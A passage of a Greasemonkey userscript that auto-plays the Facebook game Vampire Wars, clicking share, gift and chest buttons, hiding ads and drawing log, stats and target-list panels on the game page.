				}
			} else if (collectorRehireElt) {
				GM_setValue('collectorState', 4);
				//addToLog('Collector is available for Re-hire (too late)');
				var now = Math.floor(new Date().getTime() / 1000);
				GM_setValue('CollectorDue',now);
			} else {
				GM_setValue('collectorState', -1);
				//addToLog('Collector state UNKNOWN');
			}
		}
		catch (e){ GM_log(e);}
	}

	if (GM_getValue('paused')==undefined) GM_setValue('paused',1);
}



// Borrowed from MWAP:
function setFBParams() {
  // Get FB name
  var fbName = document.getElementById("navAccountName");
  if (fbName) GM_setValue('FBName', fbName.innerHTML);

  // Get language
  GM_setValue('language', document.documentElement.lang);

  sendMWValues(['language','FBName']);
}


// Borrowed from MWAP:
// [CHROME] Copy GM values to background storage
// Note: This method is not synchronous
function copyVWValues (gmKeys) {
  if (gvar.isGreaseMonkey) return;
  var gmPairs = {};
  for (var i in gmKeys)
    gmPairs[gmKeys[i]] = '';
  gmPairs.action = 'getGM';
//  chrome.extension.sendRequest(gmPairs, function(response) {
//    for (var i in response)
//      GM_setValue(i, response[i])
//  });
}

// Borrowed from MWAP:
// [CHROME] Fetch GM values from background storage
// Note: This method is not synchronous
function sendMWValues(gmKeys) {
  if (gvar.isGreaseMonkey) return;
  var gmPairs = {};
  for (var i in gmKeys)
    gmPairs[gmKeys[i]] = GM_getValue(gmKeys[i]);
  gmPairs.action = 'setGM';
  chrome.extension.sendRequest(gmPairs);
}


// Borrowed from MWAP:
function customizeLayout() {
  var mainDiv = xpathFirst('//div[@id="mainDiv"]');
  if (!mainDiv) return;

  // Handle Unknown error
  var unkError = xpathFirst('//div[@class="ui-dialog ui-widget ui-widget-content ui-corner-all ui-draggable ui-resizable"]');
  if (unkError) {
    log('Error encountered, reloading...');
    window.location.reload();
  }
}

// Borrowed from MWAP:
function refreshVWAPCSS() {
  try {
    var cssElt = document.getElementById('vwapCSS');
    var vwapCSS = '';
    if (cssElt) vwapCSS = cssElt.innerHTML;
    var bannerLeftPosition = 0;


    if (isGMChecked('leftAlign')) {
    	if (isGMChecked('showLostLog') || isGMChecked('showGoodTargets')) {
    		bannerLeftPosition = 200;
    	} else {
    		bannerLeftPosition = 0;
    	}
    } else {
    	if (isGMChecked('showLostLog') || isGMChecked('showGoodTargets')) {
    		bannerLeftPosition = 200;
    	} else {
    		bannerLeftPosition = 200;
    	}
    }
    
    		
    var newCSS = 'html { overflow-y: auto !important }' +
    		 '#mainDiv {position: absolute; margin-right: auto; margin-left: auto top: 0px; left: '+bannerLeftPosition+'px; width: 800px;}' +
//		 '#mainDiv .subtabnav {width: 800px;}' +
//    		 '#content { overflow-y: auto !important; overflow-x: auto !important;}' + 
                 // Hide promo boxes
//                 (isGMChecked('hideActionBox') ? ' .message_box_full, ' : '' ) +
                 (isGMChecked('hidePromoBox') ? ' .promoLeft, .promoRight, ' : '' ) +
                 (isGMChecked('hideNewsBox') ? ' .news_box, ' : '' ) +
                 ' #zbar, #zbar iframe, #zbar_main_cont, ' +
                 ' {position: absolute !important; margin:0 !important; ' +
                 '  height:0 !important; width: 0 !important; display: none !important;}' +
		 '#hireWorkers {position: absolute !important; top: 200px !important; left: 70px !important;}' +
		 '#select_friends_for_hire {position: absolute !important; top: 200px !important; left: 70px !important;}' +
		 '#BuildUpgradeWrapper {position: absolute !important; top: 200px !important; left: 70px !important;}' +
		 '#UpgradeCarousel .success_div {position: absolute !important; top: 200px !important; left: 70px !important;}' +
		 '#FavorPointBuyPopup {position: absolute !important; top: 200px !important; left: 70px !important;}' +
		 '#eldersRetreatHelpPopup {position: absolute !important; top: 200px !important; left: 70px !important;}' +
                 // ********************** Log Box CSS **********************
                 '#vwapLogBox .logEvent{border-bottom:1px solid #333; padding:4px 0px}' +
                 '#vwapLogBox .eventTime{color:#888; font-size: 10px; width:105px;  float:left}' +
                 '#vwapLogBox .eventTime,#vwapLogBox .eventIcon,#vwapLogBox .eventBody{}' +
                 '#vwapLogBox .eventBody{font-size: 10px; width:395px; float:right}' +
                 '#vwapLogBox .clear{clear:both}' +
                 // ********************** Settings Box CSS **********************
                 '#settingsBox div{font-size: 12px}';

    if (newCSS != vwapCSS){  // If CSS has changed, remove the old one and add a new one.
      remakeElement('style', document.getElementsByTagName('head')[0], {'id':'vwapCSS','type':'text/css'}).appendChild(document.createTextNode(newCSS));
    }

  } catch(ex) {
//    addToLog('warning Icon', 'BUG DETECTED (refreshVWAPCSS): ' + ex);
    GM_log('BUG DETECTED (refreshVWAPCSS): ' + ex);
  }
}


// Borrowed from MWAP:
// Perform click actions here
function doQuickClicks() {
  log('Autoplayer doQuickClicks');


  var autoPublishLimitTimeT1to2OK = false;
  var autoPublishLimitTimeT3to4OK = false;
  var autoPublishLimitRandomOK = false;

  if(GM_getValue('autoPublishLimitTimeT1toT2', '') == "checked") {
  	if(timeBetween(GM_getValue('autoPublishLimitTimeT1Time','00:00'),GM_getValue('autoPublishLimitTimeT2Time','00:00'))) {
  		autoPublishLimitTimeT1to2OK = true;
  	} else {
  		autoPublishLimitTimeT1to2OK = false;
  	}
  } else {
  	autoPublishLimitTimeT1to2OK = true;
  }

  if(GM_getValue('autoPublishLimitTimeT3toT4', '') == "checked") {
  	if(timeBetween(GM_getValue('autoPublishLimitTimeT3Time','00:00'),GM_getValue('autoPublishLimitTimeT4Time','00:00'))) {
  		autoPublishLimitTimeT3to4OK = true;
  	} else {
  		autoPublishLimitTimeT3to4OK = false;
  	}
  } else {
  	autoPublishLimitTimeT3to4OK = true;
  }
  
  if(GM_getValue('autoPublishLimitRandom', '') == "checked") {
  	if((Math.floor(Math.random()*101))<=GM_getValue('autoPublishLimitRandomPercent',0)) {
  		autoPublishLimitRandomOK = true;
  	} else {
  		autoPublishLimitRandomOK = false;
  	}
  } else {
  	autoPublishLimitRandomOK = true;
  }
  	
  	
//  addToLog('Publish Check: autoPublishLimitTimeT1to2OK='+autoPublishLimitTimeT1to2OK+' autoPublishLimitTimeT3to4OK='+autoPublishLimitTimeT3to4OK+' autoPublishLimitRandomOK='+autoPublishLimitRandomOK);
//  log('Publish Check: autoPublishLimitTimeT1to2OK='+autoPublishLimitTimeT1to2OK+' autoPublishLimitTimeT3to4OK='+autoPublishLimitTimeT3to4OK+' autoPublishLimitRandomOK='+autoPublishLimitRandomOK);
  	
  if((!autoPublishLimitTimeT1to2OK && !autoPublishLimitTimeT3to4OK) || !autoPublishLimitRandomOK) return false;

  try {
    // Common clicking method
    var doClick = function (xpath, gmFlag, logMessage) {
      var elt = xpathFirst (xpath);
      if (elt && isGMChecked(gmFlag)) {
        clickElement(elt);
        log('Clicked button for ' + gmFlag);
        addToLog('PUBLISH: Clicking button for: '+logMessage);
        return true;
      }
      return false;
    }



    // Click to publish Mandy Spins (Blood Magic):
    if (doClick('.//div[@class="wide_pop_buttons"]/a[contains(.,"Share Reward")]', 'autoPublishBloodMagic', 'Blood Magic spin')) return;
    
    // Click to publish Mission Assistance Request:
//    if (doClick('.//div[@class="mission_button mission_bottmargin"]/a[contains(.,"Ask for help and<br>Share Reward")]', 'autoPublishMissionAssistance')) return;
    if (doClick('.//div[@class="mission_button mission_bottmargin"]/a[contains(.,"Ask for help and")]', 'autoPublishMissionAssistance', 'Mission Assistance request')) return;

    // Click to publish Kills:
    if (doClick('.//div[@class="pop_buttons"]/a[contains(.,"Share Reward")]', 'autoPublishFightKill', 'Kill')) return;

    // Click to publish Promo Minions:
    if (doClick('.//div[@class="minionShareBtn"]/a[contains(.,"Share")]', 'autoPublishPromoMinion', 'Promo Minion')) return;

    // Click to publish Level Up:
    if (doClick('.//div[@class="left_large_popupbutton"]/a[contains(.,"Share Reward")]', 'autoPublishLevelUp', 'Level Up')) return;

    // Click to publish Collector Mystery Box:
    if (doClick('.//div[@class="pop_buttons"]/a[contains(.,"Share It!") and contains(.,"collector.php")]', 'autoPublishCollectorBox', 'Collector Mystery Box')) return;





//Examples from MWAP:
//    // Click the level up bonus
//    if (doClick('.//a[contains(@onclick,"postLevelUpFeedAndSend(); levelUpBoost();")]', 'autoLevelPublish')) return;
//
//    // Click the achievement bonus
//    if (doClick('.//a[contains(.,"Share the wealth!")]', 'autoAchievementPublish')) return;
//
//    // Click the reward button
//    if (doClick('.//div//a[@class="sexy_button" and contains(text(),"Reward Friends")]', 'autoWarRewardPublish')) return;
//
//    // Click the 'Call for Help!' button
//    if (doClick('.//div//a[@class="sexy_button" and contains(text(),"Call for Help")]', 'autoWarResponsePublish')) return;
//
//    // Click the 'Rally More Help!' button
//    //if (doClick('.//div//a[@class="sexy_button" and contains(text(),"Rally More Help")]', 'autoWarRallyPublish')) return;
//
//    // Can bank flag
//    var canBank = isGMChecked(cities[city][CITY_AUTOBANK]) && !suspendBank && !quickBankFail &&
//                  cities[city][CITY_CASH] >= parseInt(GM_getValue(cities[city][CITY_BANKCONFG]));
//
//    // Do quick banking
//    if (canBank && !isNaN(city) && !isNaN(cities[city][CITY_CASH])) {
//      quickBank(city, cities[city][CITY_CASH]);
//    }
//
//    // Auto-send energy pack
//    var actionElt = getActionBox('Send an energy pack to your mafia');
//    if (actionElt && isGMChecked('sendEnergyPack')) {
//      var actionLink = getActionLink (actionElt, 'Send Energy Pack');
//      DEBUG(actionLink.innerHTML);
//      if (actionLink && actionLink.scrollWidth) {
//        clickElement(actionLink);
//        DEBUG('Clicked to send energy pack to my mafia.');
//      }
//    }
//
//    // Get daily checklist bonus
//    var actionElt = getActionBox('Daily Checklist Complete');
//    if (actionElt) {
//      var actionLink = getActionLink (actionElt, 'Collect Skill Point');
//      if (actionLink && actionLink.scrollWidth) {
//        clickElement(actionLink);
//        DEBUG('Clicked to collect checklist bonus.');
//      }
//    }
//
//    // Click hide action box elements
//    var hideElts = xpath('.//a[contains(@onclick,"xw_action=dismiss_message")]', innerPageElt);
//    for (var i = 0, iLength = hideElts.snapshotLength; i < iLength; ++i) {
//      if (hideElts.snapshotItem(i)) clickElement(hideElts.snapshotItem(i));
//    }
//
//    // Click mystery gift elements
//    var mysteryElts = xpath('.//div[@class="msg_box_div_contents" and contains(.,"Mystery Bag")]', innerPageElt);
//    for (var i = 0, iLength = mysteryElts.snapshotLength; i < iLength; ++i) {
//      if (mysteryElts.snapshotItem(i) && !/display: none/.test(mysteryElts.snapshotItem(i).innerHTML)) {
//        var linkElt = getActionLink (mysteryElts.snapshotItem(i), 'Open It!');
//        if (linkElt) clickElement(linkElt);
//      }
//    }
//
//    var featJobsElt = xpathFirst('.//div[contains(@style,"graphics/featjob/")]', innerPageElt);
//    if (isGMChecked('featJob') && onHome() && featJobsElt) {
//      var collectElt = getActionLink (featJobsElt, 'Collect!');
//      var chooseElt = getActionLink (featJobsElt, 'Choose Job');
//      var jobIndex = parseInt(GM_getValue('featJobIndex',0)) + 1;
//      var jobElt = xpathFirst('.//a[contains(@onclick,"xw_action=do_holiday_job") and ' +
//                              'contains(@onclick,"job_period_id='+jobIndex+'")]', featJobsElt);
//
//      var energyReq = 30;
//      switch (jobIndex) {
//        case 1: energyReq = 30; break;
//        case 2: energyReq = 60; break;
//        case 3: energyReq = 100;
//      }
//
//      // Collect Bonus from feature jobs
//      if (collectElt) {
//        clickElement(collectElt);
//        addToLog('yeah Icon', 'Clicked to collect bonus from featured job.');
//
//      // Do featured job
//      } else if (energy >= energyReq && jobElt) {
//        clickElement(jobElt);
//        addToLog('yeah Icon', 'Clicked to peform featured job -> '+featJobNames[jobIndex - 1]+'.');
//
//      // Choose job
//      } else if (energy >= energyReq && chooseElt) {
//        clickElement(linkElt);
//      }
//    }
  } catch (ex) {
    log('Error @doQuickClicks: ' + ex);
  }
}


function customizeMasthead() {
  // Document title
  document.title = "Vampire Wars on Facebook";
  makeElement('link', document.getElementsByTagName('head')[0], {'rel':'shortcut icon','href':'http://photos-g.ak.fbcdn.net/photos-ak-sf2p/v43/58/25287267406/app_2_25287267406_4738.gif'});
  
  if(zbariframe = document.getElementById('zbar')) {
//	zbariframe.parentNode.setAttribute("style", "height 0;");
//	zbariframe.parentNode.innerHTML="";
	document.body.removeChild(zbariframe.parentNode);
  }

  if(connect_widget_iframe = xpathFirst('.//iframe[contains(@src,"www.facebook.com/plugins/like.php")]')) {
	document.body.removeChild(connect_widget_iframe);
  }

  if(snml_zbar = xpathFirst('.//*[@gameId="46"]')) {
	document.body.removeChild(snml_zbar.parentNode);
  }


}

//Get absolute banner position
bannerTop = getPositionTop(document.getElementById('banner_row')); //140
bannerLeft = getPositionLeft(document.getElementById('banner_row')); // 300
var pauseButton = document.createElement("div");
//alert('bannerLeft='+bannerLeft+' bannerTop='+bannerTop);

if (GM_getValue('paused')==0) {
	pauseButton.setAttribute("style", "position: absolute; left: "+(bannerLeft+0)+"px; top: "+(bannerTop+150)+"px; font-family: Verdana; font-size: 10pt; font-weight: 600; -moz-user-select: none; -khtml-user-select: none; cursor: pointer; color:green;");
	pauseButton.innerHTML = "Pause Autoplayer";
	pauseButton.addEventListener('click', pausePlayer, false);
	document.body.appendChild(pauseButton);
} else { 
	pauseButton.setAttribute("style", "position: absolute; left: "+(bannerLeft+0)+"px; top: "+(bannerTop+150)+"px; font-family: Verdana; font-size: 10pt; font-weight: 600; -moz-user-select: none; -khtml-user-select: none; cursor: pointer; color:red;");
	pauseButton.innerHTML = "Resume Autoplayer";
	pauseButton.addEventListener('click', resumePlayer, false);
	document.body.appendChild(pauseButton);
}
    
//Create Bank status
statsTop = getPositionTop(document.getElementById('stats_div'));
statsLeft = getPositionLeft(document.getElementById('stats_div'));

expTop = getPositionTop(document.getElementById('levelupdiv'));
expLeft = getPositionLeft(document.getElementById('levelupdiv'));
    
// menu logic
var settingsButton =  makeElement('div', document.body);
	settingsButton.innerHTML = "open settings";
	settingsButton.setAttribute("style", "position: absolute; left: "+(bannerLeft+10)+"px; top: "+(bannerTop+10)+"px; font-family: Verdana; font-size: 10pt; font-weight: 600; -moz-user-select: none; -khtml-user-select: none; cursor: pointer; color: #AA0000;");
	settingsButton.addEventListener('click', toggleSettings, false);

if (GM_getValue('autoLog', '') == 'checked'){		
    var viewLogButton = makeElement('div', document.body);
        viewLogButton.innerHTML = "View Log";
        viewLogButton.setAttribute("style", "position: absolute; left: "+(bannerLeft+815)+"px; top: "+(bannerTop+76)+"px; font-family: Verdana; font-size: 10pt; font-weight: 600; -moz-user-select: none; -khtml-user-select: none; cursor: pointer;color: #AA0000;");
        viewLogButton.addEventListener('click', toggleLogBox, false);

    var clrLogButton = makeElement('div', document.body);
        clrLogButton.innerHTML = "Clear Log";
        clrLogButton.setAttribute("style", "position: absolute; left: "+(bannerLeft+915)+"px; top: "+(bannerTop+76)+"px; font-family: Verdana; font-size: 10pt; font-weight: 600; -moz-user-select: none; -khtml-user-select: none; cursor: pointer;color: #AA0000;");
        clrLogButton.addEventListener('click', clearLog, false);

    var playerVampNameDisplay = makeElement('div', document.body);
        playerVampNameDisplay.innerHTML = "Vampire: "+GM_getValue('playerVampName', '(unknown)');
        playerVampNameDisplay.setAttribute("style", "position: absolute; left: "+(bannerLeft+1015)+"px; top: "+(bannerTop+76)+"px; font-family: Verdana; font-size: 12pt; font-weight: 600; color: #AA0000;");

    var vwapLogBox = makeElement('div', document.body);
    	vwapLogBox.id = 'vwapLogBox';
		vwapLogBox.innerHTML = GM_getValue('itemLog', 'log empty');
// Moved Log to Right and set default to visible
		vwapLogBox.setAttribute("style", "position: absolute; overflow: scroll; left: "+(bannerLeft+815)+"px; top: "+(bannerTop+100)+"px;  width: 520px; height: 600px; background: black url(http://facebook6.vampires.static.zynga.com/31993/css/ui/border_deco_fb.jpg); font-family: Verdana; font-size: 8pt; color: #FFFFFF; text-align: left; padding: 5px; border: 1px dotted; visibility: hidden; z-index: 999999;");
	    if(logOpen == true){
	        viewLogButton.innerHTML = "Hide Log";
	        vwapLogBox.style.visibility = "visible";
	    }


    var bannerLeftPosition = 0;


    if (isGMChecked('leftAlign')) {
    	if (isGMChecked('showLostLog') || isGMChecked('showGoodTargets')) {
    		bannerLeftPosition = 200;
    	} else {
    		bannerLeftPosition = 0;
    	}
    } else {
    	if (isGMChecked('showLostLog') || isGMChecked('showGoodTargets')) {
    		bannerLeftPosition = 200;
    	} else {
    		bannerLeftPosition = 200;
    	}
    }


// Quicklinks Box
// Collect number of boosts from Stats page for display in Quick Links box
    var quickLinksBox = makeElement('div', document.body);
    	quickLinksBox.id = 'quickLinksBox';
		quickLinksBox.setAttribute("style", "position: absolute; left: "+(bannerLeft+815)+"px; top: "+(bannerTop-0)+"px;  width: 300px; height: 60px; background: black url(http://facebook6.vampires.static.zynga.com/31993/css/ui/border_deco_fb.jpg); font-family: Verdana; font-size: 8pt; color: #FFFFFF; text-align: left; padding: 5px; border: 1px dotted; visibility: visible; z-index: 999999;");

    refreshQuickLinksBox();


// Active Magic Box
    var activeMagicBox = makeElement('div', document.body);
    	activeMagicBox.id = 'activeMagicBox';
		activeMagicBox.setAttribute("style", "position: absolute; left: "+(bannerLeft+815+300+20)+"px; top: "+(bannerTop-0)+"px;  width: 200px; height: 60px; background: black url(http://facebook6.vampires.static.zynga.com/31993/css/ui/border_deco_fb.jpg); font-family: Verdana; font-size: 8pt; color: #FFFFFF; text-align: left; padding: 5px; border: 1px dotted; visibility: visible; z-index: 999999;");


    refreshActiveMagicBox();


// Stats Box
// Collect stats on various items
    var statsBox = makeElement('div', document.body);
    	statsBox.id = 'statsBox';
		statsBox.setAttribute('style', 'position: absolute; left: '+(bannerLeft+815)+'px; top: '+(bannerTop+725)+'px;  width: 520px; height: 110px; background: black url(http://facebook6.vampires.static.zynga.com/31993/css/ui/border_deco_fb.jpg); font-family: Verdana; font-size: 8pt; color: #FFFFFF; text-align: left; padding: 5px; border: 1px dotted; visibility: visible; z-index: 999999;');
   	
//    var resetStatsBoxButton = makeElement("div", statsBox,{"style":"position: absolute; left:"+(bannerLeft+170)+"px; top: "+(bannerTop+5)+"px; color:red; font-size: 8pt; -moz-user-select: none; -khtml-user-select: none; cursor: pointer;"});
    var resetStatsBoxButton = makeElement("div", statsBox,{"style":"position: absolute; left:"+(bannerLeft-bannerLeftPosition+490)+"px; top: "+(5)+"px; color:red; font-size: 8pt; -moz-user-select: none; -khtml-user-select: none; cursor: pointer;"});
        resetStatsBoxButton.innerHTML  = "Reset";
        resetStatsBoxButton.addEventListener('click', resetStatsBox, false);

    refreshStatsBox();

    if(GM_getValue('showStatsBox', 'checked') != "checked") {
	statsBox.style.visibility = "hidden";
    }



// Automatically add to avoid list vamps I have lost to 
    var fightLossesBox = makeElement('div', document.body);
    	fightLossesBox.id = 'fightLossesBox';
		fightLossesBox.setAttribute("style", "position: absolute; left: "+(bannerLeft-200)+"px; top: "+bannerTop+"px;  width: 175px; height: 175px; background: black url(http://facebook6.vampires.static.zynga.com/31993/css/ui/border_deco_fb.jpg); font-family: Verdana; font-size: 8pt; color: #FFFFFF; text-align: left; padding: 5px; border: 1px dotted; visibility: visible; z-index: 999999;");
		fightLossesBox.innerHTML = "Fights Lost:<br>"+GM_getValue('autoFightLossList');
    if(GM_getValue('showLostLog', '') != "checked") {
	fightLossesBox.setAttribute("style", "visibility: hidden;");
    }




// Automatically add to avoid list vamps I have lost in the Arena to 
    var fightArenaLossesBox = makeElement('div', document.body);
    	fightArenaLossesBox.id = 'fightArenaLossesBox';
		fightArenaLossesBox.setAttribute("style", "position: absolute; left: "+(bannerLeft-200)+"px; top: "+(bannerTop+200)+"px;  width: 175px; height: 175px; background: black url(http://facebook6.vampires.static.zynga.com/31993/css/ui/border_deco_fb.jpg); font-family: Verdana; font-size: 8pt; color: #FFFFFF; text-align: left; padding: 5px; border: 1px dotted; visibility: visible; z-index: 999999;");
		fightArenaLossesBox.innerHTML = "Arena Fights Lost:<br>"+GM_getValue('autoFightArenaLossList');
    if(GM_getValue('showLostLog', '') != "checked") {
	fightArenaLossesBox.setAttribute("style", "visibility: hidden;");
    }




    var fightGoodTargetsBox = makeElement('div', document.body);
    	fightGoodTargetsBox.id = 'fightGoodTargetsBox';
		fightGoodTargetsBox.setAttribute("style", "position: absolute; left: "+(bannerLeft-200)+"px; top: "+(bannerTop+400)+"px;  width: 175px; height: "+(25+(GM_getValue('autoGoodTargetListSize',0)*13))+"px; background: black url(http://facebook6.vampires.static.zynga.com/31993/css/ui/border_deco_fb.jpg); font-family: Verdana; font-size: 8pt; color: #FFFFFF; text-align: left; padding: 5px; border: 1px dotted; visibility: visible; z-index: 999999;");

		fightGoodTargetsBox.innerHTML = "Good Targets:<br>";

		var goodTargets = GM_getValue('autoFightGoodTargetsList', '').split(",");
		for (var i=0;i<goodTargets.length-1;i++) {
			fightGoodTargetsBox.innerHTML=fightGoodTargetsBox.innerHTML+"<a href='http://apps.facebook.com/vampiresgame/stats.php?user="+parseInt(goodTargets[i])+"'>"+parseInt(goodTargets[i])+"</a><br>";
		}

    if(GM_getValue('showGoodTargets', '') != "checked") {
	fightGoodTargetsBox.setAttribute("style", "visibility: hidden;");
    }
   	
    var clearLostListButton = makeElement('div', fightLossesBox,{'style':'position: absolute; left:140px; top: 5px; color:red; font-size: 8pt; -moz-user-select: none; -khtml-user-select: none; cursor: pointer;'});
        clearLostListButton.innerHTML  = "Clear";
        clearLostListButton.addEventListener('click', clearLostList, false);

    var clearArenaLostListButton = makeElement('div', fightArenaLossesBox,{'style':'position: absolute; left:140px; top: 5px; color:red; font-size: 8pt; -moz-user-select: none; -khtml-user-select: none; cursor: pointer;'});
	clearArenaLostListButton.innerHTML  = "Clear";
	clearArenaLostListButton.addEventListener('click', clearArenaLostList, false);
   	
    var clearGoodTargetsListButton = makeElement('div', fightGoodTargetsBox,{'style':'position: absolute; left:140px; top: 5px; color:red; font-size: 8pt; -moz-user-select: none; -khtml-user-select: none; cursor: pointer;'});
        clearGoodTargetsListButton.innerHTML  = "Clear";
        clearGoodTargetsListButton.addEventListener('click', clearGoodTargetsList, false);

}

function doHighPriority(){
	// Function should return TRUE if AP is to continue after, and FALSE if AP should not process remaining steps
	log('Autoplayer doHighPriority');

	//auto-accept blood magic
	if(document.body.innerHTML.indexOf('Would you like to accept') != -1){
		try{
			var bloodmagicpopupbox = document.getElementById('sff_landing_popup');
			if(bloodmagicpopupbox.innerHTML.length==0)
				return true;

			log("Detected Blood Magic Popup "+bloodmagicpopupbox.innerHTML);	
			setTimeout(function(){getElementsByAttribute(bloodmagicpopupbox,"a", "href", "*sff_landing*")[0].click();},delay);
			// Get the Accept link.
			elt = xpathFirst('.//div[@id="sff_landing_popup"]//div[@class="landingAccept"]//a[contains(@href,"index2.php?sff_landing")]', innerPageElt);
			var bloodmagictext = xpathFirst('.//div[@id="sff_landing_popup"]//div[@class="landingText"]', innerPageElt).innerHTML.split('Would you like to accept ')[1].split(') from ')[0];
			//alert('Blood Magic: '+bloodmagictext);
			if (!elt) {
			    log('Can\'t find Blood Magic Accept link to click. ');
			    return true;
			}

			// Accept the Blood Magic, even if AutoPlayer is paused.
			setTimeout(function() {clickAction = 'accept';clickElement(elt);log('Accepting Blood Magic');}, 0)

			if (isGMChecked('logBloodMagic')) addToLog("Accepting Blood Magic: "+bloodmagictext+")");
			return false;
		} catch (e){ GM_log(e);}
	}

	if(document.body.innerHTML.indexOf("Would you like to accept")!=-1){
		var accept = document.evaluate("//input[@value='Accept All']", document, null, XPathResult.UNORDERED_NODE_SNAPSHOT_TYPE, null);
		if(accept.snapshotLength == 1) {
			accept.snapshotItem(0).click();
			return false;
		}
	}


	// Auto-choose Ancient Chests
	if (isGMChecked('autoPublishAncientChests') && document.body.innerHTML.indexOf("You've uncovered an Ancient Vampiric Chest full of special items") != -1) {
		try{
			var ancientchestpopupbox = document.getElementById('mission_cache_items');
			if(ancientchestpopupbox==null)
				return true;

			addToLog("Detected Ancient Chest");	
			//addToLog("Detected Ancient Chest: "+ancientchestpopupbox.innerHTML);	
			log("Detected Ancient Chest");	
			//log("Detected Ancient Chest "+ancientchestpopupbox.innerHTML);	

			if (isGMChecked('autoPublishAncientChestsWait') && energy>=(missions[GM_getValue('selectMission', 1)][1]+parseInt(GM_getValue('missionExpReserve', 0)))) {
				addToLog("Waiting until all energy is spent");
				log("Waiting until all energy is spent");
				return true;
			}

			var ancientChestOptionPrio = new Array(10,10,10,10,10);
			var ancientChestOptionStr = new Array(0,0,0,0,0);
			var ancientChestOptionText = new Array("(unknown)","(unknown)","(unknown)","(unknown)","(unknown)");
			var ancientChestHighestPrio = 10;
			var ancientChestHighestStr = -1;
			var ancientChestChoice = 0;
			var ancientChestChoiceText = "(unknown)";
			var ancientChestAllText = "Chest Selections:";

			var chestOptions  = document.evaluate("//div[@id='mission_cache_items']//td[@valign='top']",document,null,XPathResult.UNORDERED_NODE_SNAPSHOT_TYPE,null);

			for (tmp = 0; tmp < chestOptions.snapshotLength; tmp++)
			{
				var chestOptionName =chestOptions.snapshotItem(tmp).innerHTML.split('<div align="center">')[1].split('<br>')[0]; 
				//addToLog("Chest #"+tmp+" Option:"+chestOptionName);	
				var chestOptionStr = chestOptions.snapshotItem(tmp).innerHTML.split('<br>')[1].split('</div>')[0];
				if(chestOptionStr.indexOf("icon-blood.gif")!=-1)
					chestOptionStr=chestOptionStr.split('icon-blood.gif">')[1].split('</span>')[0];

				ancientChestOptionText[tmp] = chestOptionName + " " + chestOptionStr;
				ancientChestAllText = ancientChestAllText+"<br> "+tmp+": "+chestOptionName + " " + chestOptionStr;

				chestOptionStr=chestOptionStr.replace(/,/g, '');
				chestOptionStr=chestOptionStr.replace(/x/g, '');
				chestOptionStr=chestOptionStr.replace(/\+/g, '');
				chestOptionStr=parseInt(chestOptionStr);
				ancientChestOptionStr[tmp] = chestOptionStr;
				//addToLog("Chest #"+tmp+" Str:"+ancientChestOptionStr[tmp]);	




				for(i=8;i>0;i--) {
					chestPrioVar = 'autoChestPrio'+i;
					chestPrioOption = autoChestDescrips[parseInt(GM_getValue(chestPrioVar))];
					if(chestOptionName.indexOf(chestPrioOption) != -1)
						ancientChestOptionPrio[tmp] = i;
				}

				//addToLog("Chest #"+tmp+" Prio:"+ancientChestOptionPrio[tmp]);
				ancientChestHighestPrio=Math.min(ancientChestHighestPrio,ancientChestOptionPrio[tmp]);

			}
			//addToLog("Highest Chest Priority:"+ancientChestHighestPrio);

			addToLog(ancientChestAllText);	

			for (tmp = 0; tmp < ancientChestOptionStr.length; tmp++)
			{
				if(ancientChestOptionPrio[tmp]==ancientChestHighestPrio && ancientChestOptionStr[tmp]>ancientChestHighestStr) {
					ancientChestHighestStr = ancientChestOptionStr[tmp];
					ancientChestChoice = tmp;
					ancientChestChoiceText = ancientChestOptionText[tmp];
				}

			}
			//addToLog("Chosen Chest #:"+ancientChestChoice);

			var ancientChestChosenLink = xpathFirst('.//div[@id="mission_cache_items"]//a[contains(@onclick,"chooseBonus('+ancientChestChoice+',false,false)")]', innerPageElt);
			if (ancientChestChosenLink) {
				log('Selecting Chest # '+ancientChestChoice);
				clickElement(ancientChestChosenLink);

				elt = xpathFirst('.//div[@id="share_link_div"]//div[@class="sysbutton_h22 w102xh22 centered_button"]//a[@onclick="acceptItem(); showShortStoryMissionCache(); return false;" and @class="redbtn sysbutton"]', innerPageElt);

				if(isGMChecked('autoPublishAncientChestsSkip')) {
					if (!elt) {
					    log('Can\'t find skip chest link to click. ');
					} else {

						// Modify the Share Items link so it won't publish
						elt.setAttribute("onclick", "acceptItem(); return false;");

						// Pick the chest and skip.
						Autoplay.fx = function() {
						    clickAction = 'pick_and_skip_chest';
						    clickElement(elt);
						    log('Ancient Chest: selecting Chest # '+ancientChestChoice+': '+ancientChestChoiceText+' (skip publishing).');
						};
						//Autoplay.delay = delay;
						Autoplay.start();

						addToLog('Ancient Chest: selecting Chest # '+ancientChestChoice+': '+ancientChestChoiceText+' (skip publishing).');
						return false;
					}
				} else {
					if (!elt) {
					    log('Can\'t find share chest link to click. ');
					} else {

						// Share the chest.
						Autoplay.fx = function() {
						    clickAction = 'share_chest';
						    clickElement(elt);
						    log('Sharing Ancient Chest, selecting Chest # '+ancientChestChoice+': '+ancientChestChoiceText);
						};
						//Autoplay.delay = delay;
						Autoplay.start();

						addToLog('Sharing Ancient Chest, selecting Chest # '+ancientChestChoice+': '+ancientChestChoiceText);
						return false;
					}
				}

			} else {
				log('Unable to find link to select Chest # '+ancientChestChoice);
				return true;
			}


		} catch (e){ GM_log(e);}
	}

	//auto-accept gifts
	if(document.body.innerHTML.indexOf("Your pending gifts")!=-1){
		var accept = document.evaluate("//input[@value='Accept All']", document, null, XPathResult.UNORDERED_NODE_SNAPSHOT_TYPE, null);
		if(accept.snapshotLength == 1) {
			accept.snapshotItem(0).click();
			return false;
		}
		var acceptsingle = document.evaluate("//input[@value='Accept']", document, null, XPathResult.UNORDERED_NODE_SNAPSHOT_TYPE, null);
		if (acceptsingle.snapshotLength == 1) {
			acceptsingle.snapshotItem(0).click();
			return false;
		}
	}

	//autoGamble - get next free gamble time
	if (location.href.indexOf('/index') != -1 && document.body.innerHTML.indexOf('hm_akem')!=-1){
		if(document.getElementById('hm_akem').innerHTML.indexOf("Free Gamble in:")!=-1){
			LotteryDueHMS =  document.getElementById('hm_akem').innerHTML.split('Free Gamble in:')[1].split('class="treasure_timer">')[1].split('</span>')[0];
			if(LotteryDueHMS.indexOf("NOW")!=-1){
				LotteryDue = 0;
			} else {
				LotteryDue = (LotteryDueHMS.split(':')[0] * 3600) + (LotteryDueHMS.split(':')[1] * 60) + (LotteryDueHMS.split(':')[2] * 1);
			}
			var now = Math.floor(new Date().getTime() / 1000);
			GM_setValue('LotteryDue',now + LotteryDue);
		}
	}



	//autoSpin - get next free Blood Magic spin time
	if (location.href.indexOf('/index') != -1 && document.body.innerHTML.indexOf('hm_mandy')!=-1){
		if(document.getElementById('hm_mandy').innerHTML.indexOf("Free Spin in")!=-1){
